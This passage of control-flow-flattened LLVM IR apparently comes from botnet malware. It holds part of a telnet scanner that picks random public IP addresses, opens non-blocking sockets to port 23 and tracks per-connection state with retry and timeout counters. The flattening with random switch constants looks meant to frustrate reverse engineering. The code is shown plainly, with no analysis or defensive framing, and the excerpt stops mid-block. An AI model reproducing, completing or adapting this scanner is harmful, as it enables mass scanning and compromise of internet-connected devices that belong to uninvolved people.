  store i32 -874356341, i32* %switchVar
  store i32 4096, i32* %.reg2mem253
  br label %loopEnd

; <label>:20:                                     ; preds = %loopEntry
  %21 = load i32, i32* %1, align 4
  store i32 -874356341, i32* %switchVar
  store i32 %21, i32* %.reg2mem253
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %.reload254 = load i32, i32* %.reg2mem253
  store i32 %.reload254, i32* %1, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %23, align 4
  %24 = call zeroext i16 @htons(i16 zeroext 23) #13
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %27 = getelementptr inbounds [8 x i8], [8 x i8]* %26, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %27, i8 0, i64 8, i32 4, i1 false)
  %28 = load i32, i32* %1, align 4
  %29 = zext i32 %28 to i64
  %30 = call i8* @llvm.stacksave()
  store i8* %30, i8** %9, align 8
  %31 = alloca %struct.telstate_t, i64 %29, align 16
  store %struct.telstate_t* %31, %struct.telstate_t** %.reg2mem32
  %.reload234 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %32 = bitcast %struct.telstate_t* %.reload234 to i8*
  %33 = load i32, i32* %1, align 4
  %34 = sext i32 %33 to i64
  %35 = mul i64 %34, 5
  call void @llvm.memset.p0i8.i64(i8* %32, i8 0, i64 %35, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  store i32 -1082859493, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %2, align 4
  %38 = load i32, i32* %1, align 4
  %39 = icmp slt i32 %37, %38
  %40 = select i1 %39, i32 418095944, i32 -517799221
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %.reload233 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload233, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #4
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %.reload232 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload232, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %.reload231 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload231, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  store i32 1700827274, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %57 = load i32, i32* %2, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %2, align 4
  store i32 -1082859493, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  store i32 -1051367995, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  store i32 -1783829561, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1165950950, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i32, i32* %2, align 4
  %64 = load i32, i32* %1, align 4
  %65 = icmp slt i32 %63, %64
  %66 = select i1 %65, i32 1954010776, i32 1482621472
  store i32 %66, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %2, align 4
  %69 = sext i32 %68 to i64
  %.reload230 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload230, i64 %69
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %70, i32 0, i32 2
  %72 = load i8, i8* %71, align 8
  %73 = zext i8 %72 to i32
  store i32 %73, i32* %.reg2mem235
  store i32 -434478272, i32* %switchVar
  br label %loopEnd

NodeBlock29:                                      ; preds = %loopEntry
  %.reload252 = load volatile i32, i32* %.reg2mem235
  %Pivot30 = icmp slt i32 %.reload252, 7
  %74 = select i1 %Pivot30, i32 -70927092, i32 -330206310
  store i32 %74, i32* %switchVar
  br label %loopEnd

NodeBlock27:                                      ; preds = %loopEntry
  %.reload244 = load volatile i32, i32* %.reg2mem235
  %Pivot28 = icmp slt i32 %.reload244, 100
  %75 = select i1 %Pivot28, i32 -272957231, i32 -1680171686
  store i32 %75, i32* %switchVar
  br label %loopEnd

NodeBlock25:                                      ; preds = %loopEntry
  %.reload239 = load volatile i32, i32* %.reg2mem235
  %Pivot26 = icmp slt i32 %.reload239, 102
  %76 = select i1 %Pivot26, i32 1145165034, i32 190411647
  store i32 %76, i32* %switchVar
  br label %loopEnd

NodeBlock23:                                      ; preds = %loopEntry
  %.reload237 = load volatile i32, i32* %.reg2mem235
  %Pivot24 = icmp slt i32 %.reload237, 103
  %77 = select i1 %Pivot24, i32 1489081367, i32 1662348100
  store i32 %77, i32* %switchVar
  br label %loopEnd

LeafBlock21:                                      ; preds = %loopEntry
  %.reload236 = load volatile i32, i32* %.reg2mem235
  %SwitchLeaf22 = icmp eq i32 %.reload236, 103
  %78 = select i1 %SwitchLeaf22, i32 137993737, i32 1457871078
  store i32 %78, i32* %switchVar
  br label %loopEnd

NodeBlock19:                                      ; preds = %loopEntry
  %.reload238 = load volatile i32, i32* %.reg2mem235
  %Pivot20 = icmp slt i32 %.reload238, 101
  %79 = select i1 %Pivot20, i32 -2048483564, i32 957968293
  store i32 %79, i32* %switchVar
  br label %loopEnd

NodeBlock17:                                      ; preds = %loopEntry
  %.reload243 = load volatile i32, i32* %.reg2mem235
  %Pivot18 = icmp slt i32 %.reload243, 9
  %80 = select i1 %Pivot18, i32 -534084882, i32 1551940561
  store i32 %80, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload241 = load volatile i32, i32* %.reg2mem235
  %Pivot16 = icmp slt i32 %.reload241, 10
  %81 = select i1 %Pivot16, i32 98513972, i32 2140041446
  store i32 %81, i32* %switchVar
  br label %loopEnd

LeafBlock13:                                      ; preds = %loopEntry
  %.reload240 = load volatile i32, i32* %.reg2mem235
  %SwitchLeaf14 = icmp eq i32 %.reload240, 10
  %82 = select i1 %SwitchLeaf14, i32 -777934769, i32 1457871078
  store i32 %82, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload242 = load volatile i32, i32* %.reg2mem235
  %Pivot12 = icmp slt i32 %.reload242, 8
  %83 = select i1 %Pivot12, i32 366559050, i32 1426801937
  store i32 %83, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload251 = load volatile i32, i32* %.reg2mem235
  %Pivot10 = icmp slt i32 %.reload251, 3
  %84 = select i1 %Pivot10, i32 -211894468, i32 -1565679735
  store i32 %84, i32* %switchVar
  br label %loopEnd

NodeBlock7:                                       ; preds = %loopEntry
  %.reload247 = load volatile i32, i32* %.reg2mem235
  %Pivot8 = icmp slt i32 %.reload247, 5
  %85 = select i1 %Pivot8, i32 1589696892, i32 1338500814
  store i32 %85, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload245 = load volatile i32, i32* %.reg2mem235
  %Pivot6 = icmp slt i32 %.reload245, 6
  %86 = select i1 %Pivot6, i32 1257920062, i32 760875406
  store i32 %86, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload246 = load volatile i32, i32* %.reg2mem235
  %Pivot4 = icmp slt i32 %.reload246, 4
  %87 = select i1 %Pivot4, i32 681637380, i32 -403555104
  store i32 %87, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload250 = load volatile i32, i32* %.reg2mem235
  %Pivot2 = icmp slt i32 %.reload250, 1
  %88 = select i1 %Pivot2, i32 -2118769016, i32 -1753940797
  store i32 %88, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload248 = load volatile i32, i32* %.reg2mem235
  %Pivot = icmp slt i32 %.reload248, 2
  %89 = select i1 %Pivot, i32 1576235559, i32 -1197147008
  store i32 %89, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload249 = load volatile i32, i32* %.reg2mem235
  %SwitchLeaf = icmp eq i32 %.reload249, 0
  %90 = select i1 %SwitchLeaf, i32 679231034, i32 1457871078
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %2, align 4
  %93 = sext i32 %92 to i64
  %.reload229 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %94 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload229, i64 %93
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %94, i32 0, i32 8
  %96 = load i8*, i8** %95, align 8
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 1024, i32 1, i1 false)
  %97 = load i32, i32* %2, align 4
  %98 = sext i32 %97 to i64
  %.reload228 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %99 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload228, i64 %98
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %99, i32 0, i32 3
  %101 = load i8, i8* %100, align 1
  %102 = icmp ne i8 %101, 0
  %103 = select i1 %102, i32 775201850, i32 1656367068
  store i32 %103, i32* %switchVar
  br label %loopEnd

; <label>:104:                                    ; preds = %loopEntry
  %105 = load i32, i32* %2, align 4
  %106 = sext i32 %105 to i64
  %.reload227 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %107 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload227, i64 %106
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %107, i32 0, i32 8
  %109 = load i8*, i8** %108, align 8
  store i8* %109, i8** %10, align 8
  %110 = load i32, i32* %2, align 4
  %111 = sext i32 %110 to i64
  %.reload226 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %112 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload226, i64 %111
  %113 = bitcast %struct.telstate_t* %112 to i8*
  call void @llvm.memset.p0i8.i64(i8* %113, i8 0, i64 32, i32 16, i1 false)
  %114 = load i8*, i8** %10, align 8
  %115 = load i32, i32* %2, align 4
  %116 = sext i32 %115 to i64
  %.reload225 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload225, i64 %116
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %117, i32 0, i32 8
  store i8* %114, i8** %118, align 8
  %119 = call i32 @getRandomPublicIP()
  %120 = load i32, i32* %2, align 4
  %121 = sext i32 %120 to i64
  %.reload224 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %122 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload224, i64 %121
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %122, i32 0, i32 1
  store i32 %119, i32* %123, align 4
  store i32 -1414117419, i32* %switchVar
  br label %loopEnd

; <label>:124:                                    ; preds = %loopEntry
  %125 = load i32, i32* %2, align 4
  %126 = sext i32 %125 to i64
  %.reload223 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %127 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload223, i64 %126
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %127, i32 0, i32 5
  %129 = load i8, i8* %128, align 1
  %130 = add i8 %129, 1
  store i8 %130, i8* %128, align 1
  %131 = load i32, i32* %2, align 4
  %132 = sext i32 %131 to i64
  %.reload222 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %133 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload222, i64 %132
  %134 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %133, i32 0, i32 5
  %135 = load i8, i8* %134, align 1
  %136 = zext i8 %135 to i64
  %137 = icmp eq i64 %136, 14
  %138 = select i1 %137, i32 1658316061, i32 317908353
  store i32 %138, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %2, align 4
  %141 = sext i32 %140 to i64
  %.reload221 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload221, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 5
  store i8 0, i8* %143, align 1
  %144 = load i32, i32* %2, align 4
  %145 = sext i32 %144 to i64
  %.reload220 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %146 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload220, i64 %145
  %147 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %146, i32 0, i32 4
  %148 = load i8, i8* %147, align 2
  %149 = add i8 %148, 1
  store i8 %149, i8* %147, align 2
  store i32 317908353, i32* %switchVar
  br label %loopEnd

; <label>:150:                                    ; preds = %loopEntry
  %151 = load i32, i32* %2, align 4
  %152 = sext i32 %151 to i64
  %.reload219 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %153 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload219, i64 %152
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %153, i32 0, i32 4
  %155 = load i8, i8* %154, align 2
  %156 = zext i8 %155 to i64
  %157 = icmp eq i64 %156, 7
  %158 = select i1 %157, i32 263376456, i32 -1344114678
  store i32 %158, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i32, i32* %2, align 4
  %161 = sext i32 %160 to i64
  %.reload218 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload218, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 3
  store i8 1, i8* %163, align 1
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:164:                                    ; preds = %loopEntry
  store i32 -1414117419, i32* %switchVar
  br label %loopEnd

; <label>:165:                                    ; preds = %loopEntry
  %166 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %166, align 4
  %167 = call zeroext i16 @htons(i16 zeroext 23) #13
  %168 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %167, i16* %168, align 2
  %169 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %170 = getelementptr inbounds [8 x i8], [8 x i8]* %169, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %170, i8 0, i64 8, i32 4, i1 false)
  %171 = load i32, i32* %2, align 4
  %172 = sext i32 %171 to i64
  %.reload217 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %173 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload217, i64 %172
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %173, i32 0, i32 1
  %175 = load i32, i32* %174, align 4
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %177 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %176, i32 0, i32 0
  store i32 %175, i32* %177, align 4
  %178 = call i32 @socket(i32 2, i32 1, i32 0) #4
  %179 = load i32, i32* %2, align 4
  %180 = sext i32 %179 to i64
  %.reload216 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload216, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 0
  store i32 %178, i32* %182, align 16
  %183 = load i32, i32* %2, align 4
  %184 = sext i32 %183 to i64
  %.reload215 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %185 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload215, i64 %184
  %186 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 16
  %188 = icmp eq i32 %187, -1
  %189 = select i1 %188, i32 172660390, i32 -420910185
  store i32 %189, i32* %switchVar
  br label %loopEnd

; <label>:190:                                    ; preds = %loopEntry
  store i32 127744604, i32* %switchVar
  br label %loopEnd

; <label>:191:                                    ; preds = %loopEntry
  %192 = load i32, i32* %2, align 4
  %193 = sext i32 %192 to i64
  %.reload214 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %194 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload214, i64 %193
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %194, i32 0, i32 0
  %196 = load i32, i32* %195, align 16
  %197 = load i32, i32* %2, align 4
  %198 = sext i32 %197 to i64
  %.reload213 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload213, i64 %198
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %199, i32 0, i32 0
  %201 = load i32, i32* %200, align 16
  %202 = call i32 (i32, i32, ...) @fcntl(i32 %201, i32 3, i8* null)
  %203 = or i32 %202, 2048
  %204 = call i32 (i32, i32, ...) @fcntl(i32 %196, i32 4, i32 %203)
  %205 = load i32, i32* %2, align 4
  %206 = sext i32 %205 to i64
  %.reload212 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload212, i64 %206
  %208 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %207, i32 0, i32 0
  %209 = load i32, i32* %208, align 16
  %210 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %211 = call i32 @connect(i32 %209, %struct.sockaddr* %210, i32 16)
  %212 = icmp eq i32 %211, -1
  %213 = select i1 %212, i32 1644508671, i32 -1342453266
  store i32 %213, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = call i32* @__errno_location() #13
  %216 = load i32, i32* %215, align 4
  %217 = icmp ne i32 %216, 115
  %218 = select i1 %217, i32 1112796183, i32 -1342453266
  store i32 %218, i32* %switchVar
  br label %loopEnd

; <label>:219:                                    ; preds = %loopEntry
  %220 = load i32, i32* %2, align 4
  %221 = sext i32 %220 to i64
  %.reload211 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload211, i64 %221
  %223 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %222, i32 0, i32 0
  %224 = load i32, i32* %223, align 16
  %225 = call i32 @sclose(i32 %224)
  %226 = load i32, i32* %2, align 4
  %227 = sext i32 %226 to i64
  %.reload210 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %228 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload210, i64 %227
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %228, i32 0, i32 3
  store i8 1, i8* %229, align 1
  store i32 -902386074, i32* %switchVar
  br label %loopEnd

; <label>:230:                                    ; preds = %loopEntry
  %231 = load i32, i32* %2, align 4
  %232 = sext i32 %231 to i64
  %.reload209 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload209, i64 %232
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %233, i32 0, i32 2
  store i8 1, i8* %234, align 8
  %235 = load i32, i32* %2, align 4
  %236 = sext i32 %235 to i64
  %.reload208 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %237 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload208, i64 %236
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %237, i32 0, i32 6
  store i32 0, i32* %238, align 4
  store i32 -902386074, i32* %switchVar
  br label %loopEnd

; <label>:239:                                    ; preds = %loopEntry
  store i32 63385401, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load i32, i32* %2, align 4
  %242 = sext i32 %241 to i64
  %.reload207 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload207, i64 %242
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %243, i32 0, i32 6
  %245 = load i32, i32* %244, align 4
  %246 = icmp eq i32 %245, 0
  %247 = select i1 %246, i32 -1455645088, i32 282500381
  store i32 %247, i32* %switchVar
  br label %loopEnd

; <label>:248:                                    ; preds = %loopEntry
  %249 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %250 = load i32, i32* %2, align 4
  %251 = sext i32 %250 to i64
  %.reload206 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %252 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload206, i64 %251
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %252, i32 0, i32 6
  store i32 %249, i32* %253, align 4
  store i32 282500381, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 -908873095, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  %256 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %257 = getelementptr inbounds [16 x i64], [16 x i64]* %256, i64 0, i64 0
  %258 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %257) #4, !srcloc !5
  %259 = extractvalue { i64, i64* } %258, 0
  %260 = extractvalue { i64, i64* } %258, 1
  %261 = trunc i64 %259 to i32
  store i32 %261, i32* %11, align 4
  %262 = ptrtoint i64* %260 to i64
  %263 = trunc i64 %262 to i32
  store i32 %263, i32* %12, align 4
  store i32 -247866694, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  store i32 -1155070364, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = load i32, i32* %2, align 4
  %267 = sext i32 %266 to i64
  %.reload205 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload205, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 0
  %270 = load i32, i32* %269, align 16
  %271 = srem i32 %270, 64
  %272 = zext i32 %271 to i64
  %273 = shl i64 1, %272
  %274 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %275 = load i32, i32* %2, align 4
  %276 = sext i32 %275 to i64
  %.reload204 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload204, i64 %276
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %277, i32 0, i32 0
  %279 = load i32, i32* %278, align 16
  %280 = sdiv i32 %279, 64
  %281 = sext i32 %280 to i64
  %282 = getelementptr inbounds [16 x i64], [16 x i64]* %274, i64 0, i64 %281
  %283 = load i64, i64* %282, align 8
  %284 = or i64 %283, %273
  store i64 %284, i64* %282, align 8
  %285 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %285, align 8
  %286 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %286, align 8
  %287 = load i32, i32* %2, align 4
  %288 = sext i32 %287 to i64
  %.reload203 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %289 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload203, i64 %288
  %290 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %289, i32 0, i32 0
  %291 = load i32, i32* %290, align 16
  %292 = add nsw i32 %291, 1
  %293 = call i32 @select(i32 %292, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %293, i32* %3, align 4
  %294 = load i32, i32* %3, align 4
  %295 = icmp eq i32 %294, 1
  %296 = select i1 %295, i32 1516746836, i32 1889650322
  store i32 %296, i32* %switchVar
  br label %loopEnd

; <label>:297:                                    ; preds = %loopEntry
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %298 = load i32, i32* %2, align 4
  %299 = sext i32 %298 to i64
  %.reload202 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload202, i64 %299
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 16
  %303 = bitcast i32* %7 to i8*
  %304 = call i32 @getsockopt(i32 %302, i32 1, i32 4, i8* %303, i32* %6) #4
  %305 = load i32, i32* %7, align 4
  %306 = icmp ne i32 %305, 0
  %307 = select i1 %306, i32 1602033375, i32 99304830
  store i32 %307, i32* %switchVar
  br label %loopEnd

; <label>:308:                                    ; preds = %loopEntry
  %309 = load i32, i32* %2, align 4
  %310 = sext i32 %309 to i64
  %.reload201 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload201, i64 %310
  %312 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %311, i32 0, i32 0
  %313 = load i32, i32* %312, align 16
  %314 = call i32 @sclose(i32 %313)
  %315 = load i32, i32* %2, align 4
  %316 = sext i32 %315 to i64
  %.reload200 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %317 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload200, i64 %316
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %317, i32 0, i32 2
  store i8 0, i8* %318, align 8
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %.reload199 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload199, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 3
  store i8 1, i8* %322, align 1
  store i32 -908957450, i32* %switchVar
  br label %loopEnd

; <label>:323:                                    ; preds = %loopEntry
  %324 = load i32, i32* %2, align 4
  %325 = sext i32 %324 to i64
  %.reload198 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %326 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload198, i64 %325
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %326, i32 0, i32 0
  %328 = load i32, i32* %327, align 16
  %329 = load i32, i32* %2, align 4
  %330 = sext i32 %329 to i64
  %.reload197 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload197, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 0
  %333 = load i32, i32* %332, align 16
  %334 = call i32 (i32, i32, ...) @fcntl(i32 %333, i32 3, i8* null)
  %335 = and i32 %334, -2049
  %336 = call i32 (i32, i32, ...) @fcntl(i32 %328, i32 4, i32 %335)
  %337 = load i32, i32* %2, align 4
  %338 = sext i32 %337 to i64
  %.reload196 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload196, i64 %338
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %339, i32 0, i32 6
  store i32 0, i32* %340, align 4
  %341 = load i32, i32* %2, align 4
  %342 = sext i32 %341 to i64
  %.reload195 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload195, i64 %342
  %344 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %343, i32 0, i32 7
  store i16 0, i16* %344, align 16
  %345 = load i32, i32* %2, align 4
  %346 = sext i32 %345 to i64
  %.reload194 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem32
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload194, i64 %346
